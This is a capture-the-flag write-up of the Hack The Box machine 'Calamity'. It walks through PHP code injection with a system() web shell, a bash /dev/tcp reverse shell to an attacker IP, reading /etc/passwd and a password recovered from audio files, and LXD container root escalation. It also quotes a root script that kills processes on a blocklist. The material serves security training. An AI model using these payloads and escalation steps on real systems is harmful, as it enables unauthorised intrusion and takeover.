---
permalink: /posts/HTB/Calamity
title:  "HTB Calamity"
author: Luc Kolen
description: "Calamity is a hard Linux machine on HTB"
categories:
  - CTF
  - HTB
tags:
  - HTB-Hard
  - Linux
  - Gobuster
  - Steganography
  - LXC
---
# 10.10.10.27 - Calamity

|Hack The Box|Created by|Points|
|---|---|---|
|[Link](https://www.hackthebox.eu/home/machines/profile/37)|[forGP](https://www.hackthebox.eu/home/users/profile/198)|40|

- [10.10.10.27 - Calamity](#10101027---calamity)
  - [Open ports](#open-ports)
  - [HTTP](#http)
    - [uploads](#uploads)
    - [admin.php](#adminphp)
  - [Privilege escalation](#privilege-escalation)
  - [TL:DR](#tldr)
  - [Bonus](#bonus)
    - [Intended solution via Buffer overflow](#intended-solution-via-buffer-overflow)
    - [Why did our reverse shell crash](#why-did-our-reverse-shell-crash)

## Open ports

```bash
luc@kali:~/HTB/Calamity$ nmap -vv --reason -Pn -A --osscan-guess --version-all -p- 10.10.10.27
```

|Port|Service|Version
|---|---|---|
22/tcp|ssh|OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp|http|Apache httpd 2.4.18 ((Ubuntu))

## HTTP

`http://10.10.10.27/` shows a HTML page noting that the e-store is under development. There are no links to other pages so we'll have to find other content another way.

```bash
luc@kali:~/HTB/Calamity$ gobuster dir -u http://10.10.10.27 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp"
...
/index.html (Status: 200)
/uploads (Status: 301)
/admin.php (Status: 200)
```

### uploads

Uploads is an empty directory, but maybe we can go back to this directory if we find a way to upload files

### admin.php

```html
<html>
  <head>
  </head>
  <body>
    <form method="post">
    Password: <input type="text" name="user"><br>
    Username: <input type="password" name="pass">
    <input type="submit" value="Log in to the powerful administrator page">
    <!-- password is:skoupidotenekes-->
    </form>
  </body>
</html>

```

We get shown a login form and looking at the source we can find the password in a HTML comment. We can also see that the labels for the input fields are switched.

```http
POST /admin.php HTTP/1.1
Host: 10.10.10.27

user=admin&pass=skoupidotenekes
```

We are now logged into the admin page.

```text
TADAA IT HAS NOTHING
what were you waiting for dude ?you know I aint finished creating
xalvas,the boss said I am a piece of shit and that I dont take my job seriously...but when all this is set up...Ima ask for double the money
just cauz he insulted me
Maybe he's still angry at me deleting the DB on the previous site...he should keep backups man !
anyway I made an html interpreter to work on my php skills ! It wasn't easy I assure you...I'm just a P-R-O on PHP !!!!!!!!!
access in here is like 99% secure ,but even if that 1% reaches this page ,there's nothing they can do !
html is super-harmless to our system! Try writing some simple stuff ...and see how difficult my job is and how underpaid I am
```

We get presented a form which allows us to upload our own HTML.

```http
GET /admin.php?html=%3Cb%3ELuc%3C%2Fb%3E+Kolen HTTP/1.1
Host: 10.10.10.27

...
<b>Luc</b> Kolen
```

Our first test is actual harmless HTML as the page is intended to be used and we see that our code is visible on the page.

```http
GET /admin.php?html=%3C%3Fphp+echo+%22test%22%3B+%3F%3E HTTP/1.1
Host: 10.10.10.27

...
test
```

Sending `<?php echo "test"; ?>` results in only `test` on the page so our PHP code is executed.

```http
GET /admin.php?html=<%3fphp+phpinfo()%3b+%3f> HTTP/1.1
Host: 10.10.10.27

<tr>
   <td class="e">disable_functions</td>
   <td class="v">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,</td>
   <td class="v">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,</td>
</tr>
```

![Disabled PHP functions](/assets/images/HTB-Calamity/1.a%20disabled%20PHP%20functions.png)

Our next test uses `<?php phpinfo(); ?>` so we can see if any php functions are disabled and if so which ones are.

```http
GET /admin.php?html=<%3fphp+system($_REQUEST["cmd"])%3b+%3f>&cmd=whoami HTTP/1.1
Host: 10.10.10.27

...
www-data
```

`<?php system($_REQUEST["cmd"]); ?>` combined with `cmd=whoami` will execute the `whoami` command on the webserver and show we're running as `www-data`.

```http
GET /admin.php?html=<%3fphp+system($_REQUEST["cmd"])%3b+%3f>&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.9/443+0>%261' HTTP/1.1
Host: 10.10.10.27
```

```bash
luc@kali:~/HTB/Calamity$ sudo nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.27.
Ncat: Connection from 10.10.10.27:44792.
bash: cannot set terminal process group (1300): Inappropriate ioctl for device
bash: no job control in this shell
www-data@calamity:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We use the same PHP payload, `<?php system($_REQUEST["cmd"]); ?>`, but we change the value of `cmd` to `bash -c 'bash -i >& /dev/tcp/10.10.14.9/443 0>&1'`. This gives us a shell, but it quickly dies so we've to try something else.

```http
GET /admin.php?html=<%3fphp+system($_REQUEST["cmd"])%3b+%3f>&cmd=cat+/etc/passwd+|+grep+-v+-e+false+-e+nologin+-e+sync HTTP/1.1
Host: 10.10.10.27

...
root:x:0:0:root:/root:/bin/bash
xalvas:x:1000:1000:xalvas,,,:/home/xalvas:/bin/bash
```

We can read `/etc/passwd` and by filtering `false`, `nologin` and `sync` we can get a list of all users that can login to the machine.

```http
GET /admin.php?html=<%3fphp+system($_REQUEST["cmd"])%3b+%3f>&cmd=cat+/home/xalvas/user.txt HTTP/1.1
Host: 10.10.10.27

0790e7be************************
```

We can read the `user.txt` file this way, but we still need a way into the machine itself.

```http
GET /admin.php?html=<%3fphp+system($_REQUEST["cmd"])%3b+%3f>&cmd=ls+-lsa+/home/xalvas HTTP/1.1
Host: 10.10.10.27

...
   4 drwxr-xr-x 7 xalvas xalvas    4096 Jun 29  2017 .
   4 drwxr-xr-x 3 root   root      4096 Jun 27  2017 ..
   4 -rw-r--r-- 1 xalvas xalvas     220 Jun 27  2017 .bash_logout
   4 -rw-r--r-- 1 xalvas xalvas    3790 Jun 27  2017 .bashrc
   4 drwx------ 2 xalvas xalvas    4096 Jun 27  2017 .cache
   4 -rw-rw-r-- 1 xalvas xalvas      43 Jun 27  2017 .gdbinit
   4 drwxrwxr-x 2 xalvas xalvas    4096 Jun 27  2017 .nano
   4 -rw-r--r-- 1 xalvas xalvas     655 Jun 27  2017 .profile
   0 -rw-r--r-- 1 xalvas xalvas       0 Jun 27  2017 .sudo_as_admin_successful
   4 drwxr-xr-x 2 xalvas xalvas    4096 Jun 27  2017 alarmclocks
   4 drwxr-x--- 2 root   xalvas    4096 Jun 29  2017 app
   4 -rw-r--r-- 1 root   root       225 Jun 27  2017 dontforget.txt
   4 -rw-r--r-- 1 root   root      2231 Jun 24 05:53 intrusions
   4 drwxrwxr-x 4 xalvas xalvas    4096 Jun 27  2017 peda
3124 -rw-r--r-- 1 xalvas xalvas 3196724 Jun 27  2017 recov.wav
   4 -r--r--r-- 1 root   root        33 Jun 27  2017 user.txt
```

We can also look for other files in the `/home/xalvas` directory.

```http
GET /admin.php?html=<%3fphp+system($_REQUEST["cmd"])%3b+%3f>&cmd=base64+/home/xalvas/recov.wav HTTP/1.1
Host: 10.10.10.27

...
<base64>
```

```bash
luc@kali:~/HTB/Calamity$ base64 -d recov.wav.b64 > recov.wav
luc@kali:~/HTB/Calamity$ file recov.wav
recov.wav: RIFF (little-endian) data, WAVE audio, Microsoft PCM, 16 bit, stereo 44100 Hz
```

Where we can find a `recov.wav` file, we can base64 this file to move it to our machine. We save this base64 content as `recov.wav.b64` and decode it to `recov.wav`. Playing this file shows that it's part of [this song](https://www.youtube.com/watch?v=dQw4w9WgXcQ).

```http
GET /admin.php?html=<%3fphp+system($_REQUEST["cmd"])%3b+%3f>&cmd=ls+-lsa+/home/xalvas/alarmclocks HTTP/1.1
Host: 10.10.10.27

...
rick.wav
xouzouris.mp3
```

```http
GET /admin.php?html=<%3fphp+system($_REQUEST["cmd"])%3b+%3f>&cmd=base64+/home/xalvas/alarmclocks/rick.wav HTTP/1.1
Host: 10.10.10.27

...
<base64>
```

```bash
luc@kali:~/HTB/Calamity$ base64 -d rick.wav.b64 > rick.wav
luc@kali:~/HTB/Calamity$ file rick.wav
rick.wav: RIFF (little-endian) data, WAVE audio, Microsoft PCM, 16 bit, stereo 44100 Hz
```

We save `rick.wav` the same way as we did saving `recov.wav`. Playing `rick.wav` sounds the same as playing `recov.wav`.

```bash
luc@kali:~/HTB/Calamity$ md5sum *wav
a2c5f6ad4eee01f856348ec1e2972768  recov.wav
a69077504fc70a0bd5a0e9ed4982a6b7  rick.wav
```

We can see that the two audio files have a different md5sum so they sound the same, but aren't the same file.

![Audacity](/assets/images/HTB-Calamity/1.b%20Audacity.png)

Inverting one of the two audio files in [Audacity](https://www.audacityteam.org/) lets us hear the difference between the two files.

```text
47936..* your password is 185
```

Is what we hear after listening to just the differences. It looks like the recording is split and the password should be `18547936..*`.

```bash
luc@kali:~/HTB/Calamity$ ssh xalvas@10.10.10.27
The authenticity of host '10.10.10.27 (10.10.10.27)' can't be established.
ECDSA key fingerprint is SHA256:yT6ino7wgCPkMVczALjJ+BeH7VZB+It79p9HRVPEyuY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.27' (ECDSA) to the list of known hosts.
xalvas@10.10.10.27's password: 18547936..*
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-81-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

9 packages can be updated.
8 updates are security updates.


Last login: Fri Jun 30 08:27:25 2017 from 10.10.13.44
xalvas@calamity:~$ id
uid=1000(xalvas) gid=1000(xalvas) groups=1000(xalvas),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
xalvas@calamity:~$ wc user.txt
 1  1 33 user.txt
```

We've already opened user.txt via HTTP earlier, but we can also read it as `xalvas`.

## Privilege escalation

```bash
xalvas@calamity:~$ id
uid=1000(xalvas) gid=1000(xalvas) groups=1000(xalvas),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

`xalvas` is part of the `lxd` group, this can be compared to being in the docker group.

```bash
luc@kali:~/HTB/Calamity$ mkdir lxd
luc@kali:~/HTB/Calamity$ cd lxd
luc@kali:~/HTB/Calamity/lxd$ git clone https://github.com/saghul/lxd-alpine-builder.git
Cloning into 'lxd-alpine-builder'...
remote: Enumerating objects: 27, done.
remote: Total 27 (delta 0), reused 0 (delta 0), pack-reused 27
Receiving objects: 100% (27/27), 16.00 KiB | 264.00 KiB/s, done.
Resolving deltas: 100% (6/6), done.
luc@kali:~/HTB/Calamity/lxd$ cd lxd-alpine-builder/
luc@kali:~/HTB/Calamity/lxd/lxd-alpine-builder$ ./build-alpine -a i686
build-alpine: must be run as root
luc@kali:~/HTB/Calamity/lxd/lxd-alpine-builder$ sudo ./build-alpine -a i686
...
OK: 8 MiB in 19 packages
luc@kali:~/HTB/Calamity/lxd/lxd-alpine-builder$ ls -la
total 3188
drwxr-xr-x 3 luc  luc     4096 Jun 24 13:54 .
drwxr-xr-x 3 luc  luc     4096 Jun 24 13:53 ..
-rw-r--r-- 1 root root 3210657 Jun 24 13:54 alpine-v3.12-i686-20200624_1354.tar.gz
-rwxr-xr-x 1 luc  luc     7498 Jun 24 13:53 build-alpine
drwxr-xr-x 8 luc  luc     4096 Jun 24 13:53 .git
-rw-r--r-- 1 luc  luc    26530 Jun 24 13:53 LICENSE
-rw-r--r-- 1 luc  luc      768 Jun 24 13:53 README.md
luc@kali:~/HTB/Calamity/lxd/lxd-alpine-builder$ scp alpine-v3.12-i686-20200624_1354.tar.gz xalvas@10.10.10.27:
xalvas@10.10.10.27's password: 18547936..*
alpine-v3.12-i686-20200624_1354.tar.gz  100% 3135KB   6.9MB/s   00:00
```

We create a new [Alpine](https://alpinelinux.org/) machine, we use Alphine because it's very small and we need to transfer this file from our machine to the HTB machine (HTB machines don't have internet).

```bash
xalvas@calamity:~$ mkdir lxd
xalvas@calamity:~$ mv alpine-v3.12-i686-20200624_1354.tar.gz lxd/
xalvas@calamity:~$ cd lxd/
xalvas@calamity:~/lxd$ lxc image import alpine-v3.12-i686-20200624_1354.tar.gz --alias alphine
Image imported with fingerprint: d2e92de8b9caaf82feba106e11872959c2a8b36338ceaa0b0695ba8123195f48
xalvas@calamity:~/lxd$ lxc image list
+---------+--------------+--------+-------------------------------+------+--------+-------------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCH |  SIZE  |          UPLOAD DATE          |
+---------+--------------+--------+-------------------------------+------+--------+-------------------------------+
| alphine | d2e92de8b9ca | no     | alpine v3.12 (20200624_13:54) | i686 | 3.06MB | Jun 24, 2020 at 11:59am (UTC) |
+---------+--------------+--------+-------------------------------+------+--------+-------------------------------+
xalvas@calamity:~/lxd$ lxc init alphine privesc -c security.privileged=true
Creating privesc
xalvas@calamity:~/lxd$ lxc list
+---------+---------+------+------+------------+-----------+
|  NAME   |  STATE  | IPV4 | IPV6 |    TYPE    | SNAPSHOTS |
+---------+---------+------+------+------------+-----------+
| privesc | STOPPED |      |      | PERSISTENT | 0         |
+---------+---------+------+------+------------+-----------+
xalvas@calamity:~/lxd$ lxc config device add privesc host-root disk source=/ path=/mnt/root
Device host-root added to privesc
xalvas@calamity:~/lxd$ lxc start privesc
xalvas@calamity:~/lxd$ lxc exec privesc /bin/sh
~ # id
uid=0(root) gid=0(root)
~ # cat /mnt/root/root/root.txt
9be653e0************************
```

`lxc image import` will unpack the `.tar.gz` file and make it available. `lxc init alphine privesc -c security.privileged=true` will initialize the image and will make sure that any activity will run with the full host privileges. `lxc config device add privesc host-root disk source=/ path=/mnt/root` will mount `/` on the host to `/mnt/root` on the container. This makes sure that `/mnt/root/root/root.txt` in the container is `/root/root.txt` on the host.

## TL:DR

- Admin page with password in HTML comment
- Ability to upload PHP code
- Compare two audio files to find SSH password
- User is part of the LXC group

## Bonus

### Intended solution via Buffer overflow

There is a application `/home/xalvas/app/goodluck` that can be run as root and is vulnerable to a buffer overflow. An excellent writeup on this can be found [here](https://reboare.github.io/hackthebox/calamity.html#goodluck).

### Why did our reverse shell crash

```bash
~ # ls /mnt/root/root
peda      root.txt  scr
~ # cat /mnt/root/root/scr
#!/usr/bin/python
import os
import time
from datetime import datetime
while True:
    time.sleep(2)
    x=os.popen("netstat -pantu").read()
    os.system("chmod 333 /tmp");
    for line in x.split('\n'):
        name="fafafafa"
        pid="fafafafa"
        try:
            name=line[line.index('/')+1:]
            pid=line[:line.index('/')]
            pid=pid[pid.rfind(' '):]
        except ValueError:
            dummylol="dummy";
        try:
            kill=name[:line.index(' ')-1]
            if kill=="nc"  or kill=="sh" or kill=="/bin/sh" or kill=="/bin/nc" or "python" in name or "bash" in name or "dash" in name or "tmux" in name or  "ruby" in name:
                out="POSSIBLE INTRUSION BY BLACKLISTED PROCCESS "+name+"...PROCESS KILLED AT "+str(datetime.now())+'\n'
                file = open('/home/xalvas/intrusions', 'a')
                file.write(out)
                file.close()
                os.system("kill -9"+pid)
                dummylol="dummy";
        except ValueError:
            dummylol="dummy";
```

```bash
xalvas@calamity:~$ ps aux | grep scr
root      1054  0.0  0.5  12120  5892 ?        S    Jun23   0:23 /usr/bin/python /root/scr
xalvas    3877  0.0  0.0   6732   804 pts/0    S+   08:40   0:00 grep --color=auto scr
```

We can see a python script `scr` in `/root` on the host. We can use our root access to read this file and we see that there is a loop running which checks for running processes and killing those who are blacklisted.
